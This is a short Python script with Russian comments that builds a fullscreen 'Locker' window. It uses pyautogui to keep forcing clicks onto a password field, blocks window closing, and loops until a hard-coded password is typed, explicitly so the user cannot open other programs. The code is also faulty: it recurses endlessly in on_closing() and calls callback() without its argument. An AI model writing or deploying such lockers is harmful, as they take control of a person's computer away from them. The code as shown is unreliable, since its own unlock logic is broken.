from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep 
def callback(event):
	global k,entry
	if entry.get()=="hello": k=True
def on_closing():
	click(675,420)
	moveTo(675,420)
	root.attributes("-fullscreen",True)	
	root.protocol("WM_DELETE_WINDOW",on_closing())
	root.update()	
	root.bind('<Control-KeyPress-c>',callback())
root=Tk() # Создание окна
root.title("Locker") # Заголовочное название
root.attributes("-fullscreen",True) # Расширение под экран
entry=Entry(root, font=1) # Поле ввода 
entry.place(width=150, height=50, x=600, y=400 ) # Координаты и размеры
labell0=Label(root, text="Locker_by_#5 71", font=1) # Надпись 1.Необязательно
labell0.grid(row=0, column=0) # Координаты надписи 1.
labell1=Label(root, text="Write the Password and Press Ctrl+C", font=1) # Надпись 2
labell1.place(x=470,y=300) # Координаты надписи 2
root.update() # Чтобы юзер не мог открыть посторонние программы
sleep(0.2); click(675,420) # Обновление экрана программы
k=False #
while k!=True: on_closing() #